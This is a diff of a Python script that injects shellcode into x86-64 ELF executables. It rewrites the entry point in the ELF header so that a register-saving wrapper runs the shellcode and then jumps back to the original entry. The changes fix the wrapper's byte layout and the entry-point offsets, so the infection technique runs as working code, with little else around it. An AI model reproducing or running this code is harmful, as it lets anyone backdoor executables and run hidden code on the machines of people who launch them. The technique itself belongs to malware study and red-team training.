@@ -15,15 +15,15 @@ hexPrint = lambda x: " ".join(hex(i) for i in x)
 
 def gen_sc_wrapper(legit_e_entry, new_e_entry, shellcode):
     sc_wrapper = b""
-    sc_wrapper += b"\xcc"
-    sc_wrapper += b"\x50\x53\x51\x52\x55\x56\x57\x41\x50\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57\xe8\x00\x00\x00\x00\x5b\x48\x81\xeb"
-    print(len(sc_wrapper))
+    # sc_wrapper += b"\xcc" # bpoint
+    # sc_wrapper += b"\xcc"
+    sc_wrapper += b"\xe8\x00\x00\x00\x00\x54\x50\x53\x51\x52\x55\x56\x57\x41\x50\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57" # pushes
+    sc_wrapper += shellcode
+    sc_wrapper += b"\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59\x41\x58\x5f\x5e\x5d\x5a\x59\x5b\x58\x5c\x5b\x48\x81\xeb" # popes
     sc_wrapper += new_e_entry
     sc_wrapper += b"\x48\x81\xc3"
     sc_wrapper += legit_e_entry
-    sc_wrapper += b"\x53"
-    sc_wrapper += shellcode
-    sc_wrapper += b"\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59\x41\x58\x5f\x5e\x5d\x5a\x59\x5b\x58\x58\x41\xff\xe7"
+    sc_wrapper += b"\x53\xc3"
     return sc_wrapper
 
 
@@ -69,7 +69,7 @@ def main():
     legit_loc = struct.unpack("<Q", binData[0x18:e_entry_end])[0]
     newBinData += p(loc)
     newBinData += binData[e_entry_end:loc]
-    sc = gen_sc_wrapper(p(legit_loc+40)[:4], p(loc)[:4], shellcode)
+    sc = gen_sc_wrapper(p(legit_loc)[:4], p(loc+5)[:4], shellcode)
     newBinData += sc
     newBinData += binData[loc+len(sc):]
 
